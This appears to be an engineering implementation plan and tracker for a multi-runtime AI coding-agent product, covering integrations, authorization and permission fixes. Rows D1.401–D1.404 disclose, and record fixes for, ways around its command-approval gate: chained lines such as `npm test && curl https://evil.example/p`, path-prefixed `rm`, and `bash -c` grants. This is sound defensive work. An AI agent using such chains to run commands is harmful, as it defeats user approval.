# Integrations And Authorization Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. **Every row begins by verifying its premise at HEAD**: a row closed at HEAD is a result to report, not a reason to build, and a carried verdict is a reading with a date — re-take it before quoting it.

**Goal:** finish what the runtime-parity closure deliberately did not — (1) the 94 rows that plan deferred on 2026-09-10, carried here with their verdicts intact; (2) the upstream surfaces the three version lifts SURFACE as new and this fork does not yet consume; (3) the authorization work — identity, sign-in, credential lifecycle — which the parity plan touched only where a runtime forced it to.

**Born:** 2026-09-10 as row P7.7 of `docs/superpowers/plans/2026-08-22-runtime-parity-closure.md`, under the owner ruling of 2026-09-10, points 2 and 6 — *"the non-essential is deferred to the very end, and probably to a separate plan, with a clear pass over what is left, so the owner can read what each remaining row is for"* and *"a follow-up plan is drafted for what is left: the new integrations to update, and the authorization work"*.

**Sequencing (owner, 2026-09-12):** this plan runs THIRD in the queue — after the coverage-95 plan's close-out (the runtime
lifts C3.380 and 1.38.0) and after `docs/superpowers/plans/2026-08-22-dp-auth-wave2-and-mcp-exposure.md` (refreshed
2026-09-12 to HEAD, `a25f77a3b`). Two consequences for readers of this file: (1) the I2 rows were written against SDK
0.3.247 / codex rust-v0.150.1 and are RE-DERIVED at the lifted versions before any dispatches; (2) the A3 rows that carry
the dp-auth plan's T-rows (`A3.6`–`A3.13`, `A3.16`, `A3.17`) are executed from THAT plan under its option A unless the
owner answers its §Ownership question otherwise — until then nothing here is marked moved.

**Architecture:** unchanged from the plan this one follows. The base agent stays host-side (SessionManager + session-tools + shared pipeline); Pi is built to Claude Code's documentation; capability variance is DATA (`ComposerCapabilities`, tool projection, `runtime-switch-costs.ts`), never renderer branches. Three standing rules govern every row here and are carried by REFERENCE rather than restated:

- **Native-first, and the host is the smooth seam** (owner, 2026-08-28). For any capability: does the runtime already have it → can the host supply it uniformly for all three → only then build per runtime, recording why the first two failed. The second half is not optional: a native mechanism adopted without a switch verdict is a NEW silent divergence, not a closed gap. Every Phase 2 row is an instance of it.
- **Read, do not invent** (owner, 2026-08-28). Nearest documented solution → reference implementation → ask the owner → invent last, with the reason written. Claude: the page is the contract. Codex: `github.com/openai/codex` outranks the page. *"I could not find it documented"* is a finding to record; several rows below carry exactly that, with what was searched.
- **The balance rule** (owner, 2026-09-10). Where a question is open, the answer is the recommendation closest to the runtime's own documentation, with the least code and the simplest host coverage. A PRODUCT posture is still the owner's: record it as a proposal, keep the default, continue.

**Readers of this file, stated so nobody is surprised:**

- `python3 scripts/plan-status.py` does **NOT** read this plan — it is pinned to `2026-08-22-runtime-parity-closure.md` in its own source. There is no counter for this tracker; count its rows directly.
- `python3 scripts/sort-plan-tracker.py <this file> --check` **does**, and must stay green.
- `python3 scripts/sort-plan-tracker.py --shas` (the `lint:plan-shas` step of `lint:chain`) reads EVERY plan, so every commit cell here must name a real commit or an em dash, and every `|` inside a cell must be escaped as a backslash-pipe — an unescaped one drops the row from every column-indexed reader.
- `python3 scripts/build-parity-report.py` reads the FULL TEXT of every plan under `docs/superpowers/plans/` as a directory glob, so this file moves its §3 the moment it lands. The controller regenerates it at close-out; do not regenerate it from a lane.

## Global Constraints

- Bun; branch `feat/TCODE-000`; one commit per row with the row's own subject; no `Co-Authored-By` trailers. Commit ONLY as `git commit -F <msgfile> -- <pathspec>`; a NEW file by the new-file recipe (index proven empty, `git add -- <exact path>`, immediate pathspec commit, index proven empty again).
- Implementation-first verification budget (AGENTS.md): focused tests for the changed behaviour, the affected package typecheck, `git diff --check`. Whole-repo gates only at a wave boundary or close-out.
- i18n: any new renderer string lands in ALL locales; the locale hunk is committed FIRST and ALONE; `lint:i18n:parity` + `lint:i18n:sorted` green. Write the character, never a `\uXXXX` escape.
- Every settings key any reader names must be in `packages/shared/src/config/validators.ts`'s `StoredConfigKnownFields` and `StoredConfigSchema` — the reader, the envelope and the guard's fixture in ONE commit.
- No real credential or token in any file, fixture, commit or report — lengths and booleans only. This constraint binds Phase 3 hardest.
- `rm -rf release` before `bun test`; never two concurrent `bun test` processes; read the FILE COUNT of every run.
- Sequencing: **Phase 2 rows tagged *rides P7.x* dispatch only after that lift has landed** — a reconciliation written against the old bundle measures the bundle it was written against.

## Phase 1 — Deferred from the parity closure (`D1.1`–`D1.130`)

Every row the parity plan marks `Deferred 2026-09-10` appears here ONCE, by its own id, with the task verbatim, the glyph it carried, and the LAST decision or verdict sentence of its source note. **Nothing was re-decided and nothing was rewritten**: the full note — evidence, native-mechanism clause, done-means, sequencing hazards — stays in the source plan under the source id, and `## Pointers back` is the complete map in both directions.

The owner's ruling asked for *a clear pass over what is left, so the owner can read what each remaining row is for*. These are the six slices; every one of the 94 rows is in exactly one.

**1. Second-order measure arms (70 rows).** A `measure:` row is a live drive on the packaged build with the owner's credentials — never lane work. The ruling named 27 of them plus two W10 builds as gating 1.36.0 because without them a user's ordinary day on a runtime is unproven; these are the rest — managed clamps, prompt-cache switches, telemetry headers, hook output fields, plugin-scope corners, and the second arms of behaviours whose first arm is already proven. They are worth keeping because each names an unmeasured behaviour with a rig already designed, and they are cheap to drive in batches at a sitting.

**2. Landed with a routed residue (7 rows, all 🟨).** `D1.1` (P2.255) · `D1.2` (P2.285) · `D1.3` (P2.491) · `D1.37` (P6.275) · `D1.46` (P6.311) · `D1.59` (P6.373) · `D1.83` (P6.538). The work landed; what remains is named in the row's own note tail and is usually one hand-off, one command entry, or one packaged arm.

**3. Blocked on upstream or on a live rig (2 rows).** `D1.4` (P3.141) · `D1.14` (P6.110). `D1.4` (P3.141) is the classifier row — ⬜, parked and live-owed, the classifier prompt being inside the closed SDK — and `D1.14` (P6.110) is the `/tasks` / `/workflows` row, ⛔. The sentence that stood here until 2026-09-17 had the two the other way round, against this plan's own `## Pointers back` map and against both row lines; the WAVE I-1 table's *Not this wave* line inherited it and lane WI-f's brief described the SAME row twice while naming `P6.110` nowhere (WI-f, 2026-09-17).

**4. Deferred postures (3 rows).** `D1.85` (P6.815) · `D1.86` (P6.840) · `D1.94` (P7.8) — the three the ruling itself routed here by name. Each is a decision the owner has not been asked for yet, and each keeps its default until it is.

**5. Host builds still open (4 rows).** `D1.25` (P6.151) · `D1.36` (P6.241) · `D1.69` (P6.419) · `D1.80` (P6.464). Real gaps with a designed shape and no blocker other than priority.

**6. XS hygiene and documentation debt (8 rows).** `D1.84` (P6.656) · `D1.87` (P6.1001) · `D1.88` (P6.1002) · `D1.89` (P6.1020) · `D1.90` (P6.1021) · `D1.91` (P6.1022) · `D1.92` (P6.1025) · `D1.93` (P6.1027). Small, independent, and safe to batch — one of them (`D1.84`, P6.656) is a standing instruction rather than a lane task and closes only when its census reaches zero.

## Phase 2 — Integrations to update (`I2.1`–`I2.32`)

The three 2026-09-10 lift briefs measured what the newer runtimes publish. A lift moves a version; it does not, by itself, decide what to do with a surface that did not exist before. Each row below names ONE such surface: what it is, with a page or source citation; what the host does today; and the native-first move with a size guess. **A row here is not a promise to build** — the honest outcome for several is a recorded verdict that the host keeps its own mechanism, or that the surface is deliberately unread.

**Already owned by the active plan — do NOT re-create these.** The parity closure carries its own rows for the SDK surfaces whose reconciliation it priced: `P7.12` (the withhold set 93 → 123), `P7.13` (`autoContinueAtUsageLimit`), `P7.14` (`classifierContext`), `P7.15` (`promptCacheTtl` / `subagentPromptCacheTtl`), `P7.16` (`modelPricing` + `costBasis`), `P7.17` (cross-session inbound: `fromMode`, `projects-relay`, `notify_when_idle`), `P7.18` (`perTaskStopAffordance`, fail-closed by absence), plus `P7.9` (Pi's `session_compact_failed`) and `P7.10` (the dev Pi bundle's identity guard). They land with the lifts; this phase starts where they stop.

**Claude Agent SDK `0.3.247` (`I2.1`–`I2.14`).** From W10-e's `sdk.d.ts` diff (1 084 lines, 419 added / 47 removed) and its native-first reconciliation list. Two of the fourteen are safety-shaped (`I2.7` the deliberate-answer flag, `I2.3` a new egress surface); three are XS text corrections that ship to users or to build operators.

**codex `rust-v0.150.1` (`I2.15`–`I2.28`).** From W10-f's regenerated protocol diff — requests unchanged, **+7 notifications**, +33 generated types, `ConfigRequirements` 22 → 27, `[features]` 124 → 134. Two are safety-shaped and both concern approvals (`I2.15` stdin approvals, `I2.16` the native judge's strict-review verdict reaching nobody). One (`I2.22`) makes an AGENTS.md sentence wrong and is flagged as an owner-facing hand-off rather than a lane edit.

**Pi `0.84.3` (`I2.29`–`I2.32`).** From W10-g. One is a real BEHAVIOUR change rather than a type addition (`I2.29`: a global default is now written only when `persist` is true), and one (`I2.30`) is the build half of a decision that lives in Phase 1.

## Phase 3 — Authorization (`A3.1`–`A3.17`)

The owner's scope for this phase, in the owner's words, is *"обновить интеграции новые и сделать план с авторизацией"* — the integrations above, and a plan for authorization. The ruling names its first row: *"P6.538's codex identity arm rides span attributes, and identity is the authorization plan's subject"*.

**What was read, and where the nulls are.** Every row below cites the tree at HEAD or an existing owner decision; nothing here is invented. The sources read for this phase:

- `packages/shared/src/auth/dp/` — the eleven modules of the corporate one-click flow (`creds-store.ts`, `index.ts`, `dp-api.ts`, `dp-binary.ts`, `exchange.ts`, `jwt.ts`, `session-broker.ts`, `env-token.ts`, `dp-runtime.ts`, `errors.ts`, `internal.ts`), which are the ONLY writer of `~/.nessy/dp_auth_creds.json`.
- `packages/shared/src/auth/` — the OAuth families beside it: `claude-oauth.ts`, `chatgpt-oauth.ts`, `claude-token.ts`, `google-oauth.ts`, `endpoint-oauth.ts`, `generic-oauth.ts`, `oauth.ts`, the callback server and PKCE.
- `packages/codex-responses-adapter/src/nestor-auth.ts` and `nestor-client.ts` — the adapter's deliberately duplicated JWT predicate and the one place a token crosses that boundary.
- `packages/server-core/src/model-fetchers/nestor.ts` — the gateway catalogue's own credential path.
- `packages/shared/src/feature-flags.ts` — `PROVIDER_FLAG_DEFAULTS` and `isProviderEnabled`, which gate the two subscription cards.
- `packages/shared/src/telemetry/usage-metrics.ts`, `packages/server-core/src/pi-harness/otlp-telemetry.ts`, `packages/codex-responses-adapter/src/config-writer.ts`'s `[otel]` block and `packages/shared/src/agent/codex-agent.ts`'s resource-attribute marker — the identity surfaces.
- `docs/superpowers/plans/2026-08-22-dp-auth-wave2-and-mcp-exposure.md` — an unexecuted plan whose own sequencing line says it runs AFTER the parity closure, with owner decisions DP-1 (amended), DP-2, DP-3, DP-4 and DP-5 already taken.

**The nulls, recorded rather than filled.** `NESSY_HOME` has **0** occurrences over `packages apps` (`A3.10`) — there is no way to relocate the credential store. `apiKeySource` has **0** readers (`A3.3`) — the runtime says which credential authorized a session and the host discards the answer. Neither is a defect found by a gate; both are absences a reader had to go looking for.

**Do not duplicate what already exists.** Rows `A3.6`–`A3.13`, `A3.16` and `A3.17` have a counterpart in the 2026-08-22 wave-2 plan (T1–T8, T10–T13). They appear here because that plan's anchors were verified at a pre-parity commit and its tracker is a four-column table with no `Row` column — so its work is not dispatchable as written and no reader in this repository counts it; each row below carries the HEAD verification and names its T-id. `A3.15` is that plan's own T0 re-anchor pass and sequences FIRST. **Its T9 (Windows/Linux publish verify-and-prepare) is deliberately NOT carried** — it is release infrastructure the owner runs, not lane work, and it stays with that plan rather than being silently dropped. **If the owner would rather execute the wave-2 plan directly, `A3.6`–`A3.13`, `A3.16` and `A3.17` close as moved and this phase keeps only `A3.1`–`A3.5`, `A3.14` and `A3.15`** — that is a one-line decision, stated here so it can be taken without re-reading two plans.

## Tracker

**CLOSED 2026-09-18 at the 1.40.0 release, and every open row is CARRIED — nothing here is abandoned.**
357 rows shipped in 1.36.0 through 1.40.0. The rows still open when this plan closed live on in
`docs/superpowers/plans/2026-09-18-integrations-followup-1.41.0.md`, which keeps a one-sentence verdict, a
pointer back to the row here, and what would change it: forty-five of them in its Phases 1–6 (the carry map
is that file's §Pointers back), and the last twenty-seven in its Phase 8 — the fourteen measure sitting 6
did not reach (it stopped at `D1.131`) and the thirteen born from this release's own last waves and
sittings. **This tracker stays as it is, glyphs included**: it is where the full note, the controls and the
measured premises of every carried row are, and the follow-up plan cites it by row id rather than copying
it. Three rows born in the last hour — `D1.382`, `D1.383`, `D1.384`, the `/btw` residue — are NOT carried
because the owner kept them in 1.40.0.

**The deferred safety review of the permission seams is `F1.12` of the follow-up plan (Phase 4)**, by the
owner's decision of 2026-09-18 ~20:00: the release goes out first.

**Status glyphs:** `✅` done · `⬜` open and dispatchable · `⏸` open but BLOCKED ON AN OWNER ANSWER (never dispatch a ⏸ row) · `🟨` landed with a residue routed to its own row · `⛔` blocked on something outside this repository. Rows are inserted IN SORTED POSITION, never appended; run `python3 scripts/sort-plan-tracker.py docs/superpowers/plans/2026-09-10-integrations-and-authorization.md` after any addition.

What was missing was the second half of the done-means — the refusal was SILENT — and that is now one clause on the pi and claude lines of the disposition report every launch path emits, driven by `isManagedOriginEnvVar` at decision time; codex keeps its measured `n/a`. 8/0. The split from F46 stands: F46 is the 1.36.0 sitting case P6.287 (which connection and model actually answer the title request, live on the built app), F48 is this row. No ledger cell moves: F46 and F48 stay unfilled until their own runs. **SIT-5d 2026-09-18 — ANSWERED on all three runtimes (case `RS-62`, `ef760aa23`, PASS 15/15).** The first turn's spawn share, as `cold − warm` over four identical turns on the product's own message timestamps: **pi 5 504 ms cold / 532 warm → 4 972 ms (90 %); codex 4 689 / 1 354 → 3 335 (71 %); claude 5 714 / 2 655 → 3 059 (54 %)**. P6.288's criterion — *"if the spawn dominates on claude, `startup()` is a small follow-up row"* — is MET at 54 %, and C3.76 already established that `startup()` and `WarmQuery` are declared in the vendored `sdk.d.ts` with zero importers, so the follow-up is wiring and not construction. The split is a subtraction because a packaged build reports no spawn time anywhere. | D1.54 | measure: a tool whose input schema has a root-level `anyOf`/`oneOf`/`allOf` gets three different treatments and on claude ships argument-less | ✅ | `ecc058ac2` | Carried from runtime-parity-closure P6.354 (verdicts intact): Three runtimes, three ways, no switch verdict — the verdict is part of done_means. **Pointer:** the source row's full note stays in `docs/superpowers/plans/2026-08-22-runtime-parity-closure.md` under P6.354; nothing was rewritten here. **Why this one runs first (C3.145, W15-g2, 2026-09-11):** on claude the failure is SILENT and reads as a model mistake. `packages/shared/src/agent/claude-agent.ts` symbol `jsonSchemaToZodShape` builds a tool's parameter shape from `schema.properties` alone, so a tool whose input schema is a root-level `anyOf`/`oneOf`/`allOf` with no sibling `properties` ships with an EMPTY parameter shape — argument-less — while `packages/shared/src/agent/claude-agent.ts` symbol `jsonPropToZod` handles the same keywords correctly one level down, inside a property. Pi's gateway proxy STRIPS the four keywords instead and codex is unread, so the three runtimes fail three different ways; only claude's failure is invisible to the user, who sees a tool called with no arguments and blames the model. **WI-u 2026-09-17 (measure sitting 3, packaged 1.39.0, narrative `docs/testing/cdp-runs/2026-09-17-measure-sitting-3.md`):** NULL this sitting, premise SHARPER than stated: `jsonSchemaToZodShape` reads `schema.properties` only, so a root-level `anyOf` yields `{}` and the tool reaches claude argument-less. **SIT-5f 2026-09-18 (measure sitting 5f, packaged 1.40.0):** ⬜, premises re-taken at HEAD with the instrument named and a fabricated-symbol control on the same instrument; see the narrative's §3. | D1.55 | measure: a long-running MCP tool call backgrounds after two minutes on Pi and nobody has driven the other two | ✅ | — | Carried from runtime-parity-closure P6.355 (verdicts intact): Native mechanism, verbatim: "pi — built in the subprocess and its only reader: `mcpAutoBackgroundDelayMs` imported `pi-agent-server/src/index.ts:96`, consumed `:2830` (`mcp-pool.ts:371` and `packages/shared/src/agent/pi-agent.ts` symbol `mcpAutoBackgroundDelayMs` are comments, so the shared pool lacks it). claude — CLI 2.1.233 ≥ documented 2.1.212 has it natively, but our servers reach it as in-process proxies and `CLAUDE_CODE_MCP_AUTO_BACKGROUND_MS` is in no agent file → unknown. codex — no equivalent message in `codex-protocol/generated`." Measurement: drive an MCP tool that sleeps past 120 s on each runtime with the delay lowered; control = the same tool returning at once. done_means: the recorded reading says, per runtime, whether the turn continues and whether a task notification carrying the result lands — and the claude `unknown` becomes a verdict rather than an inference from version arithmetic. **Pointer:** the source row's full note stays in `docs/superpowers/plans/2026-08-22-runtime-parity-closure.md` under P6.355; nothing was rewritten here. **SIT-5c 2026-09-18 (measure sitting 5c, packaged 1.40.0 from `61cfc4659`):** NOT driven — **Cheaper than the row thinks, and still an operator step.** The threshold is an ENV knob the subprocess reads — `NESSY_MCP_AUTO_BACKGROUND_MS` (`config/background-task-settings.ts` `mcpAutoBackgroundDelayMs`; `0` turns it off, a malformed value falls back to 120 000) — so no rebuild is needed, only a launch. The rig is right (`git worktree list` names both trees, the worktree's `.git` is a file) and the main checkout and the worktree each carry the plugin — but so does a third session in an UNRELATED git repository (`installedPlugins` 1, `capabilities` 1), so the worktree reading measures nothing about worktrees. The row's anticipated one-call fix EXISTS — `resolveWorktreeMainCheckout` (`packages/shared/src/agent/claude-settings-store.ts`), already used for repository-scoped permission rules per the permissions page — but calling it here would also move project TRUST, which keys off the same identity, into a directory the user never trusted; that is a product posture → D1.367. Ledger L98 `absent ᵗ` ×3, switch-safety UNIFORM. |

| D1.126 | Claude's native `EnterWorktree` moves the SDK's working directory and not the host session's — two views of "where is this session working" diverge after the tool reports success | ✅ | `f1ba25b8a` | `[claude]` `[host]` `[product]` Born 2026-09-11 at the 1.36.0 release sitting (W14-sit, PR-5; RS-27 PASS 5/5), carried here from runtime-parity-closure P6.1110 at birth. Evidence: the tool answered "Created worktree at …/worktree-mighty-gliding-galaxy. The session is now working in the worktree." while the host's recorded `workingDirectory` (`cwd-after`) equals `cwd-before`. An OWNER posture (make the host follow the SDK's cwd, or say in the session header that the runtime works elsewhere) — native-first says the SDK's own move is the mechanism and the host's job is to make the difference UNIFORM or HONEST. Size S. **WI-g 2026-09-17:** The MECHANICAL cause is found and stated at the only file that can see it (`f1ba25b8a`, `agent/backend/claude/worktree-hooks.ts`). The host is NOT blind to that worktree: `EnterWorktree` does not reach `canUseTool` but it CREATES one, and creation fires `WorktreeCreate`, so the path is leased, recorded and swept. What the host cannot do is tell WHOSE working directory moved — `hooks.md#worktreecreate` lists three creation routes and `WorktreeCreateHookInput` carries `name` and `cwd` and NO discriminator; on `EnterWorktree` the owner session is the thing that moves, so `createClaudeWorktreePort`'s success notice reads as FALSE on that route, in the user's disfavour. POSTURE stated and defaulted: option B, be HONEST rather than follow (the host does not move `workingDirectory`, for the reason D1.141 records). Residue: one sentence in `SessionManager`'s success notice — D1.220 (XS). |

Done means: the cause named with a reproduction that does not need the packaged app (a bun test driving the bridge's `remember` over a real session store), the fix, and RS-79 re-driven on a fresh build → L55 claude/codex re-stamped. What the packaged turn was waiting on is a PERMISSION CARD nobody answered, and the two runtimes raise DIFFERENT cards: on claude our own host gate (`runPreToolUseChecks` → `case 'prompt'` in `claude-agent.ts`'s `PreToolUse` hook) raises `type: "mcp_mutation"`, `description: "MCP: session/remember"`, `rememberForMinutes: 10`, and the SDK's own hook timeout then killed the call **602 965 ms** later with *"PreToolUse hook did not respond before its timeout (host client may be unreachable)"* (0 occurrences in this repo, 4 in the vendored `claude` binary); on codex the app-server's own elicitation raises *"Allow the session MCP server to run tool \"remember\"?"* with `noAlwaysAllow: true`, because the tool carries no `readOnlyHint` while `get_session_info` does — which is exactly why the case's control returned. pi asked nothing because its gate reads the canonical `permissionName` `remember` while claude and codex hand the same gate the wire name `mcp__session__remember`, which falls into the generic `mcp__` mutation branch — the same tool, the same session, the same `auto` mode, three different answers (→ D1.370, an owner posture). Residues → D1.371 (memory OFF switch never reaches codex — THIS release), D1.372 (project scope unreachable on codex), D1.373 (an unanswered card kills the call at ~603 s and leaves it behind). Read first: the SDK's own `interrupt` contract at 0.3.251 (`sdk.d.ts`, the `interrupt_cancel_queued_v1` capability and whatever option carries `cancel_queued`) and the host's queued-message delivery — whether the queued message is handed to the child BEFORE the interrupt lands, so the child treats Stop as 'end this message' and continues on the next. Done means: Stop with a queued message interrupts the running turn (the queued message then follows the product's queue posture — delivered after the interrupt, or dropped, stated), a unit arm over a fake child that advertises the capability, and RS-81 re-driven on a fresh build with both arms at 1 interrupt row. **WI-be 2026-09-18 — 🟨 `6b9980c3a` + `fb466f6a4`. The stated fix is REFUTED as the cure and the defect is located upstream of this row's zone → D1.376 (lane WI-bk, THIS release).** `cancel_queued: true` is buildable — the shipped `sdk.mjs` implements `interrupt(e)` and maps `{ cancelQueued: true }` onto the wire field, while `sdk.d.ts` declares the method with NO parameter at 0.3.251 and at 0.3.247 (`cancelQueued` occurrences in `sdk.mjs`: 0.3.233 → 0, 0.3.247 → 1, 0.3.251 → 1; the typing lag is recorded here rather than as a row, and the next lift re-probes it) — and it would cancel NOTHING here: the flag names messages the CHILD holds, and this product never gives the child one while a turn is in flight (`'queue'` parks it on `SessionManager.messageQueue` and skips `redirect()` entirely; a claude steer is `pendingSteerMessage` injected through the PreToolUse hook; the only write into the live input channel is `chatImpl`'s own turn-opening message). So `still_queued` is structurally always empty here and sending the flag would advertise a coverage this product does not have; the refusal, its measurement and the condition that would make it wrong are written on `ClaudeAgent.noteInterruptSeam` and pinned by two arms against the real SDK (the option IS honoured by a child advertising `interrupt_cancel_queued_v1`; the control — the call this product makes carries no such field, `Object.keys(request)` is exactly `['subtype']`). What the seam DID gain: the receipt is read rather than discarded, so `still_queued` is answerable on an artefact for the first time (D1.81's open question; the predictable answer is `[]` on every arm). **The measured symptom needs `cancelProcessing` never to have got past its guards** — the `Response interrupted` row is appended unconditionally for a non-silent Stop, and the queue was delivered although `queuePaused` is set whenever the queue is non-empty — so it is upstream of `forceAbort`; the overlay and inert-button explanations are eliminated from the source. **Product posture (stated):** Stop stops the running turn; a message queued behind it stays queued, stays visible in the queue list, and is delivered only when the user resumes the queue or sends again — runtime-uniform by construction (one `SessionManager.messageQueue` for Pi, codex and claude), so nothing was built for it. Keeps 🟨 until D1.376 lands and RS-81 both arms read 1 interrupt row on the rebuilt artefact, with the new `<config>/logs/runtime/<session id>-claude-host.txt` read beside the child's file. **Closed by D1.376 (WI-bk, `b1a840678`): the cause of RS-81's arm A was the renderer's event reducer lowering `session.isProcessing` on a `queued` follow-up, so no Stop affordance ever asked the host to stop** — the third independent reading of 'the method never got past its guards', one layer further out; the claude seam (this row's zone) is innocent and now records what it asked and what the child answered. Re-drive at the release sitting: RS-81 both arms at 1 interrupt row and 0 tool calls after the Stop, reading `<config>/logs/runtime/<id>-claude-host.txt` beside the child's file (`rs-81.ts`'s `diagnostic()` must stop filtering to `-claude.txt` — D1.381), plus the one-read detector: after the queued submit the composer control still reads `{"type":"button","label":"Stop"}` and `listSessions` still reports `isProcessing`. |

| D1.401 | `[safety]` `[host]` A session Always-Allow grant auto-runs anything CHAINED onto the granted prefix: `whitelistedBashPrefix` matches the leading whitespace tokens of the whole line and `isDangerousCommandLine` reads only the head, so one Always Allow on `npm test` makes `npm test && curl https://evil.example/p -o /tmp/p`, `npm test && git push origin main`, `npm test ; rm -rf ./build` run with NO card in `default`, `acceptEdits` and `auto` — while each second segment alone still prompts | ✅ | `ffbad9562` | `[safety]` `[host]` **F1.12 review 2026-09-19, finding #12 (grants) — CONFIRMED 3/3 by adversarial verifiers, each driving the REAL `runPreToolUseChecks` + `PermissionManager` at HEAD `9c34b191c`.** Controls on the same instrument: every second segment alone → PROMPT(bash); the same compound lines with an EMPTY store → PROMPT(bash), so the whitelist is the cause; `shouldAllowToolInMode` answers `{allowed:true}` in all three modes, so nothing upstream re-raises the card; the same unsplit match at the `humanApproved` exemption drops the chained segment out of the sandbox too. Sharpened by the verifiers: the reachable human repro is `npm test` or `git commit -m x && git push origin main` (git status is read-only and never raises a card); `;` needs a space (`test;` is one token); `rm -rf ~` still prompts through the removal circuit breaker, `rm -rf ./build`, `sudo rm -rf /etc/hosts`, `curl` and `git push` ride through. The module's own contract sentence (a dangerous command ALWAYS requires permission in ask mode) is false for any compound line, while `pre-tool-use.ts`'s acceptEdits set states the correct rule and `matchClaudeBashRule` (the DURABLE engine) already splits with `splitCompoundCommand` and requires EVERY segment to match. FIX: split before consulting — every segment covered by a stored key AND passing the floor; an unparseable line is not whitelisted; the same guard on the `humanApproved` exemption. Size S; **1.40.0 hotfix before the tag (owner criterion: a permission the user did not grant). Lane WI-bt.** **WI-bt 2026-09-20: ✅.** Both readers of the session grant (the ask-mode Bash arm and `shouldPromptInAutoMode`'s `excludedCommands` exemption, which drops a command out of ISOLATION as well as out of the prompt) now go through `bashSessionGrantCoversLine`, which splits with the DURABLE engine's own `splitCompoundCommand` and requires EVERY segment to be covered by a stored key AND to clear the dangerous floor; an unparseable line is not granted. Driven after the change with a store holding `npm test`: all six chained spellings (`&&`, `\|\|`, `;`, `;` with no space, a newline, a pipe) PROMPT in `default`, `acceptEdits` and `auto` where all were `allow` at HEAD, while `npm test`, `npm test -- --watch=false` and `npm test -u` stay allowed and each second segment alone still prompts. Two corrections to the finding's own note, measured: `;` without a space does NOT save you (true of the whitespace tokeniser, false of the splitter), and a PIPE is a separator too — `npm test \| tee out.txt` now prompts unless `tee` is granted, the row's one user-visible cost. |
| D1.402 | `[safety]` `[host]` The dangerous-command floor matches only the LITERAL first token, so `/bin/rm -rf x`, `/usr/bin/sudo …`, `/usr/bin/git push` and `NODE_ENV=x rm -rf x` are not dangerous — one Always Allow on such a spelling mints a session grant AND a permanent repo-wide rule (`Bash(/bin/rm *)`) for a command that, spelled plainly, always prompts | ✅ | `5ea9993f5` | `[safety]` `[host]` **F1.12 review 2026-09-19, findings #13 (grants) and #7 (floor, the same defect found twice) — CONFIRMED 3/3 at HEAD:** `isDangerousCommandLine` looks up the raw lowercased `tokens[0]` plus one verb against the list; a path-qualified or env-prefixed spelling never matches, so `persistBashAlwaysAllowRule`'s `isDangerousCommand` guard passes and both the session key and the durable rule are written. FIX: normalise the head before the lookup — strip leading `NAME=value` assignments and the directory of an absolute/relative path (`basename`), then test — and apply the same normalisation wherever the durable rule is minted; a control that the plain spelling still prompts. Size S; **1.40.0 hotfix, lane WI-bt.** **WI-bt 2026-09-20: ✅.** `isDangerousCommandLine` and `headsDangerousCommandPair` resolve the head first (leading `NAME=value` stepped over, path taken to basename, `.exe` dropped), so `/bin/rm -rf x`, `/usr/bin/sudo ls`, `/usr/bin/git push origin main` and `NODE_ENV=x rm -rf x` answer `true` as their plain spellings do, and the durable writer refuses all four where it wrote `Bash(/bin/rm *)`. Which sibling this agrees with was MEASURED and the obvious answer is wrong: the removal circuit breaker has basenamed all along, while `matchClaudeBashRule('rm:*', '/bin/rm -rf x', deny)` answers no-match and must keep doing so — a rule is the administrator's literal text, a floor is a refusal, and widening a refusal can only add a card; both readings pinned in both directions. |
| D1.403 | `[safety]` `[host]` Always Allow on a `bash -c "…"` (or `sh -c`, `zsh -c`) card writes a permanent `Bash(bash *)` rule and a `bash` session grant — arbitrary shell execution with no further prompt for the life of the repository rule | ✅ | `5ea9993f5` + `371b688fa` | `[safety]` `[host]` **F1.12 review 2026-09-19, finding #14 (grants) — CONFIRMED 3/3 at HEAD** (the card exists and offers Always Allow; `persistBashAlwaysAllowRule` keys the rule on the base command `bash`; nothing refuses a shell interpreter as a base). FIX: a shell interpreter (`bash`, `sh`, `zsh`, `fish`, `env`, `xargs`, `eval` — derive the list from `dangerous-commands.ts`'s own vocabulary, never a copy) is never a base for a durable rule or a session prefix; the card still offers Allow once, the Always-Allow choice is withheld with a sentence. Size S; **1.40.0 hotfix, lane WI-bt.** **WI-bt 2026-09-20: ✅.** Built as a WITHHOLDING, not a descent: one constant `COMMAND_INTERPRETER_HEADS` (the three sets `claude-bash-rule.ts` already maintains plus `env`/`xargs`/`eval`/`fish`/`exec`/`command`/`time`/`timeout`/`nice`) consulted by `bashSessionWhitelistKey`, so an interpreter head mints no session key and therefore no durable rule, the card mirror following; Allow-once still works. Descending into the operand was declined because per-interpreter option syntax is a second parser whose wrong answer MINTS a grant; `env FOO=1 npm test` mints nothing (the docblock names `env -S` as a documented deny-floor bypass this product closed once) while a bare `NAME=value` is stepped over because it is shell syntax. Two shas because `dangerous-commands.ts` is the one leaf the host and the renderer card share. |
| D1.404 | `[safety]` `[host]` The DURABLE Always-Allow rule is keyed on the bare base command: approving `npm test` writes a permanent repo-wide `Bash(npm *)`, so `npm publish` is granted for ever in that repository | ✅ | `9a7573a6a` | `[safety]` `[host]` **F1.12 review 2026-09-19, findings #15 (grants) and #9 (floor) — CONFIRMED 3/3 at HEAD:** `SessionManager.ts` `persistBashAlwaysAllowRule` sets `rulePrefix = baseCommand` and narrows only for the two-word dangerous family (the 1.40.0 fix), so every other command's rule is one word wide. MEDIUM by the verifiers; taken into 1.40.0 with the three HIGHs because it is the same writer and the same fix. Lane WI-bt. **WI-bt 2026-09-20: ✅.** `rulePrefix` is now `bashSessionWhitelistKey`'s answer — the same one the session grant uses — so the two stores cannot disagree about what one click bought. Rules saved by earlier versions are left exactly as they are (the release notes say so). `SessionManager.ts` line-neutral at 38354. |
